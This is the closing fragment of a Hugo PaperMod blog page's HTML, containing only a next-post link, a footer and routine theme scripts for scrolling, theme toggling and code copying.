+</a><a class=next href=https://littlebees.github.io/2020/09/blackhat-python-github-automation/><span class=title>Next »</span><br><span>blackhat python - github & automation</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://littlebees.github.io/>記事本</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
